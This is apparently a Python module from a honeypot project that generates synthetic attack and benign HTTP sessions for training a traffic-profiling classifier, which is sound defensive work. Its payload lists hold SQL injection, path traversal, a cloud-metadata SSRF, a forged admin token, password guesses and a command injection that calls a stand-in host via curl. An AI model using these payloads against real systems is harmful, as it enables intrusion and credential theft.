"""Synthetic labelled sessions for training and testing the profiler.

Generating traffic in-process (rather than only over HTTP through the
red-team tool) makes two things practical: training the ML comparison arm on
thousands of labelled sessions, and unit-testing the classifier without a
running server.

The generators encode the behavioural *definition* of each persona — pacing,
header hygiene, payload grade, and whether the client reads what it is sent.
They are intentionally noisy, with overlapping parameter ranges, so a
classifier that scores well here is not simply memorising clean archetypes.
"""

from __future__ import annotations

import json
import random
from collections.abc import Callable

from aegistrap.decoy.canary import canary_token
from aegistrap.models import AttackerPersona
from aegistrap.store import Event

_BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/128.0.0.0 Safari/537.36"
)
_BROWSER_HEADERS = {
    "user-agent": _BROWSER_UA,
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-GB,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": "https://app.northwind.test/dashboard",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "sec-ch-ua": '"Chromium";v="128", "Not=A?Brand";v="24"',
}

_SCANNER_UAS = (
    "sqlmap/1.8.2#stable (https://sqlmap.org)",
    "ffuf/2.1.0",
    "Nikto/2.5.0",
    "Mozilla/5.0 (compatible; Nuclei - Open-source project)",
    "gobuster/3.6",
    "feroxbuster/2.10.2",
    "Mozilla/5.0 zgrab/0.x",
)
_LIBRARY_UAS = (
    "curl/8.4.0",
    "python-requests/2.31.0",
    "Wget/1.21.4",
    "Go-http-client/1.1",
    "PostmanRuntime/7.36.0",
)
_AGENT_UAS = (
    "LangChain/0.2 python-httpx/0.27",
    "autonomous-pentest-agent/0.4 (openai gpt-4o)",
    "claude-agent-harness/1.2",
    "browser-use/0.1.40",
    "openhands-agent/0.9",
)

_DOC_PATHS = (
    "/api/v1/health",
    "/api/v1/accounts",
    "/api/v1/accounts/1001",
    "/api/v1/transactions?account_id=1001&limit=25",
    "/api/v1/users/me",
    "/api/v1/cards",
)
_WORDLIST_PATHS = (
    "/.env",
    "/.git/config",
    "/admin",
    "/phpinfo.php",
    "/backup.zip",
    "/wp-login.php",
    "/actuator/env",
    "/swagger",
    "/api-docs",
    "/config.json",
    "/server-status",
    "/phpmyadmin",
    "/console",
    "/debug",
    "/web.config",
    "/dump.sql",
    "/id_rsa",
    "/robots.txt",
    "/telescope",
    "/metrics",
)
_NAIVE_PAYLOADS = (
    "?q=' OR 1=1--",
    "?search=<script>alert(1)</script>",
    "?id=admin'--",
    "?file=../../../../etc/passwd",
    "?user=admin&pass=admin",
)
_ADVANCED_PAYLOADS = (
    "?id=1' AND (SELECT 4123 FROM (SELECT(SLEEP(5)))mNjP)-- Zqkl",
    "?id=1 AND 3251=(SELECT COUNT(*) FROM information_schema.columns)",
    "?filter=1' AND CASE WHEN (ASCII(SUBSTRING((SELECT password_hash FROM users LIMIT 1),1,1))>77) THEN 1 ELSE 0 END--",
    "?path=..%252f..%252f..%252fproc%2fself%2fenviron",
    "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "?export=statement;$(curl%20http://collab.test/x)",
    "?id=1/**/un/**/ion/**/sel/**/ect/**/1,2,3",
)

#: Field names the decoy leaks in verbose errors. A "reactive" client picks
#: these up from a response and uses them in a later request.
_LEAKABLE_TOKENS = (
    "ledger_shard",
    "risk_band",
    "overdraft_authorised_by",
    "fraud_score",
    "processor_ref",
    "password_hash",
    "aml_flags",
    "kyc_status",
    "session_token_seed",
)


def _event(
    seq: int,
    ts: float,
    method: str,
    path: str,
    headers: dict[str, str],
    *,
    body: str = "",
    status: int = 200,
    response: str = "",
) -> Event:
    query = ""
    if "?" in path:
        path, _, query = path.partition("?")
    return Event(
        id=seq,
        session_id="synthetic",
        seq=seq,
        ts=ts,
        method=method,
        path=path,
        query_string=query,
        headers=headers,
        body=body,
        status_code=status,
        response=response,
        generator="template",
        latency_ms=0.0,
        llm_tokens=0,
        weaknesses=[],
        persona_at_time="unknown",
    )


def _account_list_response(rng: random.Random, ids: list[str]) -> str:
    return json.dumps(
        {
            "items": [
                {
                    "id": oid,
                    "iban": f"XX02NWCB{rng.randrange(10**10):010d}",
                    "balance_minor": rng.randint(1200, 9_450_000),
                }
                for oid in ids
            ],
            "total": len(ids),
        }
    )


def _benign(rng: random.Random) -> list[Event]:
    """A legitimate first-party client.

    Note that this persona *is* response-reactive: a real front-end lists a
    collection and then fetches the IDs it was given. Reactivity therefore
    separates automation from goal-directed traffic, not attackers from
    non-attackers — payload presence does the latter.
    """
    n = rng.randint(5, 16)
    ts = 1_700_000_000.0
    events: list[Event] = []
    discovered: list[str] = []
    for i in range(n):
        ts += rng.uniform(1.5, 14.0)
        if i == 0 or not discovered:
            ids = [str(1001 + k) for k in rng.sample(range(14), rng.randint(2, 4))]
            discovered.extend(ids)
            events.append(
                _event(
                    i,
                    ts,
                    "GET",
                    "/api/v1/accounts",
                    dict(_BROWSER_HEADERS),
                    status=200,
                    response=_account_list_response(rng, ids),
                )
            )
            continue
        target = rng.choice(discovered)
        path = rng.choice(
            (
                f"/api/v1/accounts/{target}",
                f"/api/v1/transactions?account_id={target}&limit=25",
                "/api/v1/users/me",
            )
        )
        events.append(
            _event(
                i,
                ts,
                "GET",
                path,
                dict(_BROWSER_HEADERS),
                status=200,
                response=json.dumps({"id": target, "balance_minor": 481233}),
            )
        )
    return events


def _script_kiddie(rng: random.Random) -> list[Event]:
    n = rng.randint(5, 24)
    ts = 1_700_000_000.0
    ua = rng.choice(_LIBRARY_UAS)
    headers = {"user-agent": ua, "accept": "*/*"}
    if rng.random() < 0.25:
        headers.pop("user-agent")
    events: list[Event] = []
    for i in range(n):
        ts += rng.uniform(0.6, 9.0)
        if rng.random() < 0.6:
            path = rng.choice(("/api/v1/accounts", "/api/v1/users", "/api/v1/login")) + rng.choice(
                _NAIVE_PAYLOADS
            )
            status = rng.choice((200, 400, 500))
        else:
            path = rng.choice(("/admin", "/api/v1/accounts/1001", "/login", "/api/v1/health"))
            status = rng.choice((200, 401, 404))
        events.append(
            _event(
                i, ts, "GET", path, dict(headers), status=status, response='{"error":"bad_request"}'
            )
        )
    return events


def _scanner(rng: random.Random) -> list[Event]:
    n = rng.randint(25, 90)
    ts = 1_700_000_000.0
    headers = {"user-agent": rng.choice(_SCANNER_UAS), "accept": "*/*"}
    if rng.random() < 0.2:
        # Operator stripped the tool banner; behavioural signals must carry it.
        headers["user-agent"] = rng.choice(_LIBRARY_UAS)
    base_interval = rng.uniform(0.02, 0.35)
    events: list[Event] = []
    for i in range(n):
        ts += max(0.005, rng.gauss(base_interval, base_interval * rng.uniform(0.05, 0.2)))
        if rng.random() < 0.75:
            path = rng.choice(_WORDLIST_PATHS)
            status = rng.choice((404, 404, 404, 403, 200))
        else:
            path = rng.choice(("/api/v1/accounts", "/api/v1/login")) + rng.choice(_NAIVE_PAYLOADS)
            status = rng.choice((400, 404, 200))
        events.append(
            _event(
                i, ts, "GET", path, dict(headers), status=status, response='{"error":"not_found"}'
            )
        )
    return events


def _skilled_human(rng: random.Random) -> list[Event]:
    """A capable operator working by hand.

    Two things characterise this persona: irregular pacing with genuine
    thinking pauses, and exploitation that builds on what earlier responses
    disclosed.
    """
    n = rng.randint(12, 40)
    ts = 1_700_000_000.0
    headers = (
        dict(_BROWSER_HEADERS)
        if rng.random() < 0.55
        else {
            "user-agent": rng.choice(_LIBRARY_UAS),
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.8",
            "referer": "https://app.northwind.test/",
        }
    )
    events: list[Event] = []
    discovered_ids: list[str] = []
    learned_fields: list[str] = []

    for i in range(n):
        # Manual work: long, uneven gaps, including pauses to read and think.
        ts += rng.choice((rng.uniform(2.0, 9.0), rng.uniform(12.0, 70.0)))
        roll = rng.random()
        method, body, status = "GET", "", 200

        if i == 0 or not discovered_ids:
            ids = [str(1001 + k) for k in rng.sample(range(14), rng.randint(3, 6))]
            discovered_ids.extend(ids)
            path, response = "/api/v1/accounts", _account_list_response(rng, ids)
        elif roll < 0.3:
            # Walk outward from an ID that a response actually disclosed.
            base = int(rng.choice(discovered_ids))
            target = base + rng.choice((1, 1, 2, -1))
            path = f"/api/v1/accounts/{target}"
            status = rng.choice((200, 200, 403, 404))
            leaked = rng.choice(_LEAKABLE_TOKENS)
            learned_fields.append(leaked)
            response = json.dumps(
                {
                    "id": str(target),
                    "balance_minor": rng.randint(1000, 900000),
                    leaked: "eu-w1-shard-3",
                }
            )
        elif roll < 0.48:
            target = rng.choice(discovered_ids)
            path = f"/api/v1/accounts/{target}" + rng.choice(_ADVANCED_PAYLOADS)
            status = rng.choice((500, 400, 200))
            learned_fields.append("risk_band")
            response = (
                '{"error":"ProgrammingError","hint":"column accounts.risk_band does not exist"}'
            )
        elif roll < 0.6 and learned_fields:
            token = rng.choice(learned_fields)
            path = f"/api/v1/accounts?fields={token}&sort={token}"
            response = '{"items":[]}'
        elif roll < 0.72:
            method, path = "POST", "/graphql"
            body = json.dumps(
                {"query": "{ __schema { types { name fields { name type { name } } } } }"}
            )
            learned_fields.append("internalNotes")
            response = (
                '{"data":{"__schema":{"types":[{"name":"Account","fields":'
                '[{"name":"internalNotes"},{"name":"ledgerShard"}]}]}}}'
            )
        elif roll < 0.86:
            headers = {
                **headers,
                "authorization": "Bearer eyJhbGciOiJub25lIn0."
                "eyJzdWIiOiJ1c3JfMjAwMCIsInJvbGUiOiJhZG1pbiJ9.",
            }
            path = "/api/v1/admin/users"
            status = rng.choice((200, 403))
            learned_fields.append("usr_2000")
            response = '{"items":[{"id":"usr_2000","role":"admin","password_hash":"$2b$12$abc"}]}'
        else:
            method, path = "PATCH", "/api/v1/users/me"
            body = json.dumps({"role": "admin", "kyc_status": "verified"})
            status = rng.choice((200, 422))
            response = '{"id":"usr_2003","role":"customer"}'

        events.append(
            _event(i, ts, method, path, dict(headers), body=body, status=status, response=response)
        )
    return events


def _ai_agent(rng: random.Random) -> list[Event]:
    """An autonomous LLM-driven agent.

    Behaviourally this sits between a scanner and a skilled human: it reads and
    acts on responses like a human, but it paces like software — regular
    intervals set by inference latency rather than by thinking and typing.
    That timing regularity is the main discriminator, and it is why some
    sessions are only separable via the canary echo.
    """
    n = rng.randint(14, 45)
    ts = 1_700_000_000.0
    self_identifies = rng.random() < 0.45
    headers = {
        "user-agent": rng.choice(_AGENT_UAS) if self_identifies else rng.choice(_LIBRARY_UAS),
        "accept": "application/json",
        "content-type": "application/json",
    }
    echoes_canary = rng.random() < 0.5
    events: list[Event] = []
    discovered_ids: list[str] = []
    learned_fields: list[str] = ["ledger_shard"]
    base_interval = rng.uniform(0.8, 3.5)

    for i in range(n):
        ts += max(0.05, rng.gauss(base_interval, base_interval * rng.uniform(0.08, 0.3)))
        roll = rng.random()
        method, body, status = "GET", "", 200

        if i == 0 or not discovered_ids:
            ids = [str(1001 + k) for k in rng.sample(range(14), rng.randint(3, 6))]
            discovered_ids.extend(ids)
            path, response = "/api/v1/accounts", _account_list_response(rng, ids)
        elif roll < 0.26:
            target = rng.choice(discovered_ids)
            path = f"/api/v1/accounts/{target}"
            learned_fields.append("ledger_shard")
            response = json.dumps({"id": target, "ledger_shard": "eu-w1-shard-2"})
        elif roll < 0.42:
            token = rng.choice(learned_fields)
            target = rng.choice(discovered_ids)
            path = f"/api/v1/transactions?account_id={target}&fields={token}"
            learned_fields.append("processor_ref")
            response = '{"items":[{"processor_ref":"PSP-1a2b","fraud_score":0.07}]}'
        elif roll < 0.58:
            method, path = "POST", "/api/v1/auth/login"
            body = json.dumps(
                {
                    "email": "j.okafor@example.com",
                    "password": rng.choice(("Summer2024!", "Password123", "Welcome1")),
                }
            )
            status = rng.choice((200, 401))
            response = '{"error":"invalid_password","user_exists":true}'
        elif roll < 0.7:
            method, path = "POST", "/graphql"
            body = json.dumps(
                {"query": "{ accounts { id balanceMinor owner { id role internalNotes } } }"}
            )
            response = '{"data":{"accounts":[{"id":"1001","ledgerShard":"eu-w1-shard-2"}]}}'
        elif roll < 0.84:
            target = rng.choice(discovered_ids)
            path = f"/api/v1/accounts/{target}" + rng.choice(_ADVANCED_PAYLOADS)
            status = 500
            learned_fields.append("accounts_v2")
            response = '{"error":"OperationalError","hint":"relation accounts_v2 does not exist"}'
        else:
            method, path = "PATCH", "/api/v1/users/me"
            body = json.dumps({"role": "admin"})
            status = rng.choice((200, 403))
            response = '{"role":"customer"}'

        request_headers = dict(headers)
        if echoes_canary and i >= 3:
            request_headers["x-diagnostic-token"] = canary_token("synthetic")
        events.append(
            _event(
                i, ts, method, path, request_headers, body=body, status=status, response=response
            )
        )
    return events


_GENERATORS: dict[AttackerPersona, Callable[[random.Random], list[Event]]] = {
    AttackerPersona.BENIGN: _benign,
    AttackerPersona.SCRIPT_KIDDIE: _script_kiddie,
    AttackerPersona.SCANNER: _scanner,
    AttackerPersona.SKILLED_HUMAN: _skilled_human,
    AttackerPersona.AI_AGENT: _ai_agent,
}


def generate_session(persona: AttackerPersona, rng: random.Random | None = None) -> list[Event]:
    """Produce one synthetic session for the given persona."""
    generator = _GENERATORS.get(persona)
    if generator is None:
        raise ValueError(f"no synthetic generator for persona {persona!r}")
    return generator(rng or random.Random())


def generate_dataset(
    per_persona: int = 200, seed: int = 20260831
) -> list[tuple[AttackerPersona, list[Event]]]:
    """Labelled dataset covering every classifiable persona."""
    rng = random.Random(seed)
    dataset: list[tuple[AttackerPersona, list[Event]]] = []
    for persona in _GENERATORS:
        for _ in range(per_persona):
            dataset.append((persona, generate_session(persona, rng)))
    rng.shuffle(dataset)
    return dataset


def supported_personas() -> tuple[AttackerPersona, ...]:
    return tuple(_GENERATORS)
